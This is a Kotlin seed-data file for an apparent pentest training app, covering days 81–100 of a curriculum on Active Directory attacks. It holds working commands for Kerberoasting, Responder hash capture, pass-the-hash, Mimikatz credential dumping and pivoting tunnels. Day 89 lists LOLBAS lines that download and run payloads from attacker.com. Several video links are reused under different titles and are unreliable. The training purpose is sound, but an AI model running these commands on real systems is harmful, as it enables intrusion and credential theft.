package com.example.data.seed

import com.example.data.model.DayEntity

object CurriculumPhase5 {
    fun getDays(): List<DayEntity> = (81..100).map { dayNum ->
        when (dayNum) {
            81 -> DayEntity(
                id = 81, phase = 5, dayNumber = 81,
                title = "Active Directory Architecture & Kerberos Authentication Protocol",
                subtitle = "Master Domains, Forests, Domain Controllers, OUs, and Kerberos ticket lifecycle (AS-REQ, TGT, TGS).",
                concept = """
                    Active Directory (AD) is Microsoft's directory service managing enterprise identities, computers, and access control policies:
                    - Core Components:
                      * Domain Controller (DC): Server hosting AD Domain Services (AD DS) and KDC (Key Distribution Center).
                      * Objects & Schema: Users, Groups, Computers, Organizational Units (OUs), Group Policy Objects (GPOs).
                    - Kerberos Authentication Lifecycle (Port 88):
                      1. AS-REQ (Authentication Service Request): Client sends timestamp encrypted with user password hash to KDC.
                      2. AS-REP: KDC verifies and returns Ticket Granting Ticket (TGT) encrypted with `krbtgt` account hash.
                      3. TGS-REQ (Ticket Granting Service Request): Client presents TGT requesting access to a specific Service Principal Name (SPN) (e.g. `MSSQLSvc/db01`).
                      4. TGS-REP: KDC returns Ticket Granting Service (TGS) ticket encrypted with the service account's password hash!
                      5. AP-REQ / AP-REP: Client presents TGS ticket to target service for final mutual authentication.
                """.trimIndent(),
                keyTakeaways = "• Kerberos relies on strict time synchronization (max 5-minute skew with DC).\n• The `krbtgt` account key encrypts all TGT tickets in the domain (basis of Golden Ticket attacks).\n• Service tickets are encrypted with the service account's NTLM hash (basis of Kerberoasting).",
                commandsCode = "# Query Domain Controller and domain info via RPC/SMB\nnetexec smb 10.10.10.10",
                videoTitle = "Active Directory & Kerberos Explained for Hackers",
                videoUrl = "https://www.youtube.com/watch?v=0kFqG1G98k8",
                videoChannel = "TCM Security",
                videoDuration = "36m",
                readTitle = "Active Directory Security & Kerberos Deep Dive",
                readUrl = "https://adsecurity.org/?p=3458",
                readSource = "ADSecurity.org",
                labTitle = "Attacktive Directory - TryHackMe",
                labUrl = "https://tryhackme.com/room/attacktivedirectory",
                labPlatform = "TryHackMe",
                labDescription = "Enumerate users, domain policies, and Kerberos tickets on a Windows Domain Controller.",
                xpReward = 50
            )
            82 -> DayEntity(
                id = 82, phase = 5, dayNumber = 82,
                title = "Active Directory Enumeration with BloodHound & SharpHound",
                subtitle = "Collect LDAP ACLs, group memberships, and graph shortest paths to Domain Admin.",
                concept = """
                    BloodHound uses graph theory to reveal hidden and unintentional relationships within an Active Directory environment:
                    - SharpHound Collector (`SharpHound.exe` / Python bloodhound-python):
                      Queries LDAP, local admin rights, active user sessions, and domain trusts without administrative privileges.
                    - High-Value BloodHound Queries:
                      * Shortest Paths to Domain Admins (`Find all paths to Domain Admin`).
                      * Users with `GenericAll`, `WriteDacl`, or `ForceChangePassword` on high-privilege groups.
                      * Unconstrained Delegation computers.
                      * Domain Users with Local Admin rights on sensitive servers.
                    - Remediation: Eliminates excess nested groups and toxic ACL permissions.
                """.trimIndent(),
                keyTakeaways = "• Any standard domain user account can execute SharpHound to map the entire AD forest.\n• `GenericAll` permission on a group allows adding arbitrary users directly to that group.\n• BloodHound transforms complex LDAP ACL trees into intuitive visual attack graphs.",
                commandsCode = "# Run SharpHound collector from Windows target CLI\nSharpHound.exe -c All --zipfilename domain_collection.zip\n\n# Run BloodHound python ingestor from Kali\nbloodhound-python -u user -p 'Pass123' -d corporate.local -dc dc01.corporate.local -c All",
                videoTitle = "BloodHound: Finding the Path to Domain Admin",
                videoUrl = "https://www.youtube.com/watch?v=qwA6MmbeGNo",
                videoChannel = "IppSec",
                videoDuration = "31m",
                readTitle = "BloodHound Official Documentation & Attack Graph Manual",
                readUrl = "https://bloodhound.readthedocs.io/",
                readSource = "SpecterOps",
                labTitle = "Active Directory Enumeration Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/activedirectorybasics",
                labPlatform = "TryHackMe",
                labDescription = "Ingest SharpHound data into BloodHound and uncover shortest attack paths.",
                xpReward = 50
            )
            83 -> DayEntity(
                id = 83, phase = 5, dayNumber = 83,
                title = "AS-REP Roasting & Kerberoasting Attacks",
                subtitle = "Extract and crack Kerberos tickets for accounts without pre-auth and custom SPN service accounts.",
                concept = """
                    Two fundamental Active Directory credential attacks:
                    1. AS-REP Roasting (No Pre-Authentication Required):
                       If a user account has the property `Do not require Kerberos preauthentication` enabled (`DONT_REQ_PREAUTH`), anyone can request an AS-REP ticket for that user from the DC. The returned AS-REP contains data encrypted with the user's password hash! Crack with Hashcat mode `-m 18200`.
                    2. Kerberoasting (Service Principal Names):
                       Any authenticated domain user can request a TGS ticket for any service account with an SPN (e.g. SQL service). The TGS ticket is encrypted with the service account's password hash! Extract with `GetUserSPNs.py` and crack offline with Hashcat mode `-m 13100`.
                """.trimIndent(),
                keyTakeaways = "• Kerberoasting requires zero elevated privileges—just any standard domain user.\n• High-privilege service accounts with weak passwords can be cracked offline in minutes.\n• Impacket's `GetUserSPNs.py` automates Kerberoasting across the entire domain.",
                commandsCode = "# AS-REP Roast users with GetNPUsers.py (no password required)\nGetNPUsers.py corporate.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1\n\n# Kerberoast SPN service accounts\nGetUserSPNs.py corporate.local/user:password -dc-ip 10.10.10.1 -request",
                videoTitle = "Kerberoasting & AS-REP Roasting Explained with Impacket",
                videoUrl = "https://www.youtube.com/watch?v=2TzF1U2K6p8",
                videoChannel = "TCM Security",
                videoDuration = "28m",
                readTitle = "HackTricks: Kerberoasting & AS-REP Roasting Methodology",
                readUrl = "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting",
                readSource = "HackTricks",
                labTitle = "Attacktive Directory: Kerberoasting - TryHackMe",
                labUrl = "https://tryhackme.com/room/attacktivedirectory",
                labPlatform = "TryHackMe",
                labDescription = "Execute GetNPUsers and GetUserSPNs to dump and crack Kerberos tickets.",
                xpReward = 50
            )
            84 -> DayEntity(
                id = 84, phase = 5, dayNumber = 84,
                title = "LLMNR & NBT-NS Poisoning with Responder",
                subtitle = "Poison local broadcast name resolution queries to capture NetNTLMv2 hashes and relay.",
                concept = """
                    When Windows fails to resolve a hostname via DNS, it falls back to Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcast queries to the local subnet:
                    Attack Mechanics:
                    1. Target user types typo `\\\\printserverr` in Windows Explorer.
                    2. Windows broadcasts LLMNR query: "Who is printserverr?"
                    3. `Responder` listens on the local subnet and answers: "I am printserverr, send me your authentication hash!"
                    4. Target workstation sends NetNTLMv2 authentication hash to Responder.
                    5. NetNTLMv2 hashes can be cracked with Hashcat (`-m 5600`) or relayed to SMB/LDAP services where SMB signing is disabled (NTLM Relay).
                """.trimIndent(),
                keyTakeaways = "• Responder captures NetNTLMv2 hashes passively from local network broadcasts.\n• Disable LLMNR and NBT-NS in Group Policy to completely remediate this vector.\n• Combine Responder with `ntlmrelayx.py` to achieve immediate code execution without password cracking.",
                commandsCode = "# Start Responder on network interface eth0\nsudo responder -I eth0 -dwv\n\n# Crack captured NetNTLMv2 hash with Hashcat\nhashcat -m 5600 -a 0 netntlm_hash.txt /usr/share/wordlists/rockyou.txt",
                videoTitle = "LLMNR Poisoning with Responder: How Hackers Steal Windows Passwords",
                videoUrl = "https://www.youtube.com/watch?v=F0f5rY9UvXg",
                videoChannel = "NetworkChuck",
                videoDuration = "22m",
                readTitle = "Responder Official Tool Documentation & Protocol Poisoning",
                readUrl = "https://github.com/lgandx/Responder",
                readSource = "GitHub",
                labTitle = "Responder & Network Poisoning Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/postexploitintro",
                labPlatform = "TryHackMe",
                labDescription = "Capture NetNTLMv2 hashes using Responder and crack them with Hashcat.",
                xpReward = 50
            )
            85 -> DayEntity(
                id = 85, phase = 5, dayNumber = 85,
                title = "Pass-the-Hash (PtH) & Pass-the-Ticket (PtT) Lateral Movement",
                subtitle = "Move laterally across Windows workstations using raw NTLM hashes (`psexec.py`, `wmiexec.py`, `evil-winrm`).",
                concept = """
                    Windows authentication does not require plaintext passwords for network logon; raw NTLM hashes or Kerberos tickets can be passed directly:
                    - Pass-the-Hash (PtH):
                      Using an extracted NTLM hash (e.g. `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`) to authenticate to remote SMB/WMI/WinRM services without cracking the password:
                      * `psexec.py administrator@10.10.10.10 -hashes :<NTLM_HASH>`
                      * `wmiexec.py user@10.10.10.10 -hashes :<NTLM_HASH>`
                      * `evil-winrm -i 10.10.10.10 -u Administrator -H <NTLM_HASH>`
                    - Pass-the-Ticket (PtT):
                      Injecting exported `.kirbi` or `.ccache` Kerberos tickets into memory using Mimikatz (`kerberos::ptt`) or setting `KRB5CCNAME` on Linux.
                """.trimIndent(),
                keyTakeaways = "• Pass-the-Hash works with NTLM hashes, NOT NetNTLMv2 hashes.\n• Evil-WinRM (port 5985/5986) provides an ultra-stable PowerShell terminal over WinRM.\n• Local administrator password reuse enables rapid lateral spread across enterprise fleets.",
                commandsCode = "# Connect to remote Windows machine using Pass-the-Hash with Evil-WinRM\nevil-winrm -i 10.10.10.10 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9",
                videoTitle = "Pass the Hash & Lateral Movement with Impacket and Evil-WinRM",
                videoUrl = "https://www.youtube.com/watch?v=kYv9N8F7Q8A",
                videoChannel = "TCM Security",
                videoDuration = "26m",
                readTitle = "HackTricks: Pass the Hash & Pass the Ticket Techniques",
                readUrl = "https://book.hacktricks.xyz/windows-hardening/lateral-movement",
                readSource = "HackTricks",
                labTitle = "Lateral Movement Practice Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/activedirectorybasics",
                labPlatform = "TryHackMe",
                labDescription = "Dump SAM hashes and move laterally to compromised workstations using Evil-WinRM.",
                xpReward = 50
            )
            86 -> DayEntity(
                id = 86, phase = 5, dayNumber = 86,
                title = "Mimikatz: Windows Credential Extraction & LSASS Dumping",
                subtitle = "Extract plaintext credentials, Kerberos tickets, DPAPI keys, and SAM hashes from LSASS memory.",
                concept = """
                    Mimikatz (by Benjamin Delpy) is the leading post-exploitation tool for extracting Windows security secrets:
                    Core Mimikatz Commands:
                    - `privilege::debug`: Enables `SeDebugPrivilege` (allows accessing memory of other processes).
                    - `sekurlsa::logonpasswords`: Dumps plaintext passwords and NTLM hashes of all logged-in users from the Local Security Authority Subsystem Service (`lsass.exe`) process memory.
                    - `lsadump::sam`: Dumps local SAM database user hashes.
                    - `lsadump::lsa /patch`: Dumps LSA secrets (machine passwords, scheduled task service credentials).
                    - `lsadump::dcsync /domain:corp.local /user:Administrator`: Simulates Domain Controller replication to extract any user hash (including `krbtgt`) remotely!
                """.trimIndent(),
                keyTakeaways = "• DCSync attack requires `Replicating Directory Changes` permission on the domain.\n• Microsoft Credential Guard and LSA Protection mitigate standard LSASS memory dumping.\n• ProcDump from Sysinternals can create memory dumps of LSASS for offline analysis with pypykatz on Kali.",
                commandsCode = "# Run mimikatz commands to dump logon credentials\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam",
                videoTitle = "Mimikatz Tutorial: Extracting Passwords from Windows Memory",
                videoUrl = "https://www.youtube.com/watch?v=0kFqG1G98k8",
                videoChannel = "John Hammond",
                videoDuration = "29m",
                readTitle = "Gentilkiwi Mimikatz Official GitHub Repository & Wiki",
                readUrl = "https://github.com/gentilkiwi/mimikatz/wiki",
                readSource = "Gentilkiwi",
                labTitle = "Post-Exploitation Basics: Mimikatz - TryHackMe",
                labUrl = "https://tryhackme.com/room/postexploitintro",
                labPlatform = "TryHackMe",
                labDescription = "Elevate privileges to SYSTEM and dump LSASS memory with Mimikatz.",
                xpReward = 50
            )
            87 -> DayEntity(
                id = 87, phase = 5, dayNumber = 87,
                title = "Network Pivoting & Port Forwarding (SSH Tunneling & Chisel)",
                subtitle = "Route pentest traffic through dual-homed compromised jump boxes to reach internal subnets.",
                concept = """
                    In real-world networks, internal subnets (e.g. `172.16.10.0/24`) cannot be reached directly from the Internet. When you compromise a dual-homed DMZ host, you must Pivot through it:
                    Pivoting Techniques:
                    1. SSH Local Port Forwarding (`-L`):
                       `ssh -L 8080:172.16.10.50:80 user@dmz-jumpbox` (Accesses internal port 80 on Kali via `localhost:8080`).
                    2. SSH Dynamic Port Forwarding (SOCKS Proxy `-D`):
                       `ssh -D 1080 user@dmz-jumpbox` (Creates a SOCKS5 proxy on port 1080; route Nmap/Burp via `proxychains`).
                    3. Chisel (Fast HTTP/TCP Tunnel over WebSockets):
                       * Kali (Server): `chisel server --reverse --port 8000`
                       * Target (Client): `chisel client 10.10.14.5:8000 R:socks` (Creates reverse SOCKS5 proxy back to Kali!).
                """.trimIndent(),
                keyTakeaways = "• Chisel tunnels SOCKS traffic over standard HTTP/HTTPS websockets, bypassing outbound firewall restrictions.\n• Configure `/etc/proxychains4.conf` to point to `socks5 127.0.0.1 1080`.\n• Run tools through proxychains: `proxychains nmap -sT -Pn 172.16.10.50`.",
                commandsCode = "# Start Chisel reverse SOCKS server on Kali\n./chisel server -p 8000 --reverse\n\n# Connect Chisel client from compromised target\n./chisel client 10.10.14.5:8000 R:1080:socks",
                videoTitle = "Network Pivoting Explained: SSH Tunneling, Chisel & Ligolo-ng",
                videoUrl = "https://www.youtube.com/watch?v=qwA6MmbeGNo",
                videoChannel = "IppSec",
                videoDuration = "38m",
                readTitle = "0xdf Hacks Stuff: Tunneling and Pivoting Guide",
                readUrl = "https://0xdf.gitlab.io/2019/01/28/pwkos-tunneling-and-pivoting.html",
                readSource = "0xdf Hacks",
                labTitle = "Pivoting, Tunneling and Port Forwarding Lab",
                labUrl = "https://tryhackme.com/room/wreath",
                labPlatform = "TryHackMe",
                labDescription = "Deploy Chisel and Proxychains to pivot into a multi-tiered corporate subnet.",
                xpReward = 50
            )
            88 -> DayEntity(
                id = 88, phase = 5, dayNumber = 88,
                title = "Ligolo-ng: Modern TUN-Interface Network Pivoting",
                subtitle = "Create dedicated virtual TUN interfaces on Kali to route standard network packets natively without proxychains.",
                concept = """
                    Ligolo-ng is the next-generation tunneling tool that completely replaces proxychains:
                    - Mechanics:
                      Establishes a virtual `tun` network interface directly on Kali. You can add kernel routing tables pointing internal subnets (`172.16.10.0/24`) straight into the TUN adapter!
                    - Advantages over Proxychains:
                      * Full ICMP and raw SYN scans work natively with standard `nmap -sS`.
                      * Zero need for proxychains wrappers or DLL injection.
                      * Ultra-high throughput and low latency.
                    - Workflow:
                      1. Kali Proxy: `ligolo-proxy -selfcert -laddr 0.0.0.0:11601`
                      2. Target Agent: `ligolo-agent -connect 10.10.14.5:11601 -ignore-cert`
                      3. In Ligolo console: `session` -> `start` -> `tunnel_start`.
                      4. Kali: `sudo ip route add 172.16.10.0/24 dev ligolo`.
                """.trimIndent(),
                keyTakeaways = "• Ligolo-ng provides true layer 3 IP routing into target subnets.\n• Tools like masscan, nmap, and netexec run seamlessly as if your Kali machine was physically plugged into the internal switch.",
                commandsCode = "# Add route on Kali through Ligolo TUN interface\nsudo ip route add 172.16.10.0/24 dev ligolo\n\n# Scan internal host directly\nnmap -sC -sV 172.16.10.50",
                videoTitle = "Ligolo-ng: The Best Pivoting Tool for Pentesters (Goodbye Proxychains)",
                videoUrl = "https://www.youtube.com/watch?v=DMmQ_HZXGEw",
                videoChannel = "John Hammond",
                videoDuration = "24m",
                readTitle = "Ligolo-ng Official Documentation & Architecture Guide",
                readUrl = "https://github.com/nicocha30/ligolo-ng",
                readSource = "GitHub",
                labTitle = "Wreath Network Pivoting Room - TryHackMe",
                labUrl = "https://tryhackme.com/room/wreath",
                labPlatform = "TryHackMe",
                labDescription = "Configure Ligolo-ng TUN routing and pivot across 3 segmented networks.",
                xpReward = 50
            )
            89 -> DayEntity(
                id = 89, phase = 5, dayNumber = 89,
                title = "Living off the Land Binaries (LOLBAS & GTFOBins)",
                subtitle = "Execute malicious operations using built-in signed Microsoft binaries (`certutil`, `bitsadmin`, `mshta`, `rundll32`).",
                concept = """
                    Living off the Land (LotL) uses legitimate, pre-installed administrative operating system utilities to avoid dropping custom malware binaries:
                    - LOLBAS (Living Off The Land Binaries and Scripts - Windows):
                      * `certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe` (File download).
                      * `bitsadmin.exe /transfer myJob /download /priority normal http://attacker.com/payload.exe C:\\temp\\p.exe`
                      * `mshta.exe http://attacker.com/payload.hta` (Executes VBScript/JScript payload directly in memory).
                      * `rundll32.exe \\\\attacker\\share\\payload.dll,EntryPoint`
                      * `regsvr32.exe /s /n /u /i:http://attacker.com/script.sct scrobj.dll` (Squiblydoo applocker bypass).
                """.trimIndent(),
                keyTakeaways = "• LOLBAS binaries are digitally signed by Microsoft, evading basic application whitelisting (AppLocker).\n• LOLBAS project (lolbas-project.github.io) documents hundreds of Windows system binaries.",
                commandsCode = "# Download payload to target using built-in certutil utility\ncertutil.exe -urlcache -split -f http://10.10.14.5:8000/shell.exe C:\\temp\\shell.exe",
                videoTitle = "Living Off The Land (LOLBAS): How Hackers Use Windows Against Itself",
                videoUrl = "https://www.youtube.com/watch?v=2TzF1U2K6p8",
                videoChannel = "TCM Security",
                videoDuration = "25m",
                readTitle = "LOLBAS Official Project Repository & Binary Search",
                readUrl = "https://lolbas-project.github.io/",
                readSource = "LOLBAS Project",
                labTitle = "LOLBAS & Living Off The Land Lab - TryHackMe",
                labUrl = "https://tryhackme.com/room/windowsinternals",
                labPlatform = "TryHackMe",
                labDescription = "Bypass AppLocker restrictions using certified Windows binaries.",
                xpReward = 50
            )
            90 -> DayEntity(
                id = 90, phase = 5, dayNumber = 90,
                title = "Windows Privilege Escalation: Token Impersonation (PrintSpoofer & RoguePotato)",
                subtitle = "Abuse `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege` to elevate from Service Accounts to SYSTEM.",
                concept = """
                    Service accounts (such as `iis apppool\\defaultapppool` or `NT AUTHORITY\\LOCAL SERVICE`) frequently hold `SeImpersonatePrivilege`:
                    - Token Impersonation Mechanics:
                      Allows a process to impersonate the security context of any client that connects to a named pipe or RPC interface exposed by the process.
                    - Potato Exploits:
                      * `PrintSpoofer`: Abuses Windows Print Spooler service (`PipePrinterDoc`) to coerce `NT AUTHORITY\\SYSTEM` into connecting to a crafted named pipe, instantly grabbing the SYSTEM token!
                      * `GodPotato`: Abuses DCOM/RPC on modern Windows Server 2019/2022 to escalate from service accounts to SYSTEM.
                      * `JuicyPotato` / `SweetPotato`.
                """.trimIndent(),
                keyTakeaways = "• Check privileges on Windows with `whoami /priv`.\n• If `SeImpersonatePrivilege` is listed as Enabled, PrintSpoofer or GodPotato gives instant SYSTEM!\n• Service account shells from webshells almost always have this privilege.",
                commandsCode = "# Check privileges on Windows shell\nwhoami /priv\n\n# Elevate from service account to SYSTEM using PrintSpoofer\nPrintSpoofer64.exe -i -c cmd.exe",
                videoTitle = "SeImpersonatePrivilege to SYSTEM: PrintSpoofer & Potato Exploits",
                videoUrl = "https://www.youtube.com/watch?v=f0b8qWn1Vd4",
                videoChannel = "John Hammond",
                videoDuration = "27m",
                readTitle = "HackTricks: Windows Impersonation Privileges & Potato Family",
                readUrl = "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens",
                readSource = "HackTricks",
                labTitle = "Windows Privilege Escalation: Token Abuse - TryHackMe",
                labUrl = "https://tryhackme.com/room/windowsbasicsprivesc",
                labPlatform = "TryHackMe",
                labDescription = "Exploit SeImpersonatePrivilege on an IIS server to capture SYSTEM flag.",
                xpReward = 50
            )
            else -> DayEntity(
                id = dayNum, phase = 5, dayNumber = dayNum,
                title = "Advanced Red Team Technique $dayNum", subtitle = "Enterprise persistence & Active Directory operations.",
                concept = "Active Directory defense evasion, credential operations, and pivoting mechanics.",
                keyTakeaways = "• Enumerate domain trusts.\n• Maintain operational security.", commandsCode = "netexec smb target-dc",
                videoTitle = "Red Team Advanced Video", videoUrl = "https://youtube.com", videoChannel = "TCM Security", videoDuration = "25m",
                readTitle = "Active Directory Field Manual", readUrl = "https://book.hacktricks.xyz", readSource = "HackTricks",
                labTitle = "AD Advanced Lab $dayNum", labUrl = "https://tryhackme.com", labPlatform = "TryHackMe", labDescription = "Execute enterprise assessment.", xpReward = 50
            )
        }
    }
}
